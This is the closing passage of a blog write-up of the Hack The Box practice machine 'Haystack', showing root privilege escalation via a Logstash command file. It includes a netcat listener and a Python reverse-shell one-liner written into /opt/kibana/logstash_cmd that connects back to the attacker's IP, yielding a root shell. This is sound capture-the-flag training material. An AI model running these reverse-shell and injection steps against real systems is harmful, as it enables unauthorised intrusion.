<span class="nb">touch</span> /opt/kibana/logstash_cmd
bash-4.2<span class="nv">$ </span><span class="nb">chmod </span>777 /opt/kibana/logstash_cmd
<span class="nb">chmod </span>777 /opt/kibana/logstash_cmd
</pre></table></code></div></div><p>Before writing the line to the file, we need to first start another listener on our machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1338
listening on <span class="o">[</span>any] 1338 ...
</pre></table></code></div></div><p>We then proceeded to write our reverse shell command to the file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>bash-4.2<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"Ejecutar comando : python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((</span><span class="se">\"</span><span class="s2">10.10.XXX.XXX</span><span class="se">\"</span><span class="s2">,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="se">\"</span><span class="s2">/bin/
sh</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">-i</span><span class="se">\"</span><span class="s2">]);'"</span> <span class="o">&gt;&gt;</span> /opt/kibana/logstash_cmd
</pre></table></code></div></div><p>Back to our machine, we finally got a <code class="language-plaintext highlighter-rouge">root</code> shell!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>connect to <span class="o">[</span>10.10.XXX.XXX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.115] 57600
sh: no hay control de trabajos en este shell
sh-4.2# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">contexto</span><span class="o">=</span>system_u:system_r:unconfined_service_t:s0
sh-4.2# <span class="nb">cat</span> /root/root.txt
3f5fXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/elasticsearch/" class="post-tag no-text-decoration" >elasticsearch</a> <a href="/tags/kibana/" class="post-tag no-text-decoration" >kibana</a> <a href="/tags/logstash/" class="post-tag no-text-decoration" >logstash</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >ssh</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Haystack - rizemon's blog&url=https://rizemon.github.io/posts/haystack-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Haystack - rizemon's blog&u=https://rizemon.github.io/posts/haystack-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Haystack - rizemon's blog&url=https://rizemon.github.io/posts/haystack-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/writeup-htb/"><div class="card-body"> <span class="timeago small" > Oct 13, 2019 <i class="unloaded">2019-10-13T15:35:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Writeup</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! $ ech...</p></div></div></a></div><div class="card"> <a href="/posts/postman-htb/"><div class="card-body"> <span class="timeago small" > Mar 15, 2020 <i class="unloaded">2020-03-15T11:33:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Postman</h3><div class="text-muted small"><p> Despite the name of this box, it was nowhere related to Postman! This box was quite weird as I actually jumped straight to root instead of going to user first. Configuration The operating syste...</p></div></div></a></div><div class="card"> <a href="/posts/traverxec-htb/"><div class="card-body"> <span class="timeago small" > Apr 12, 2020 <i class="unloaded">2020-04-12T02:48:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Traverxec</h3><div class="text-muted small"><p> This box was the last Easy box of the year 2019 and it has made me realise that I really have went a long way since the start of my journey in HackTheBox. Configuration The operating systems th...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/writeup-htb/" class="btn btn-outline-primary"><p>Hack The Box - Writeup</p></a> <a href="/posts/networked-htb/" class="btn btn-outline-primary"><p>Hack The Box - Networked</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
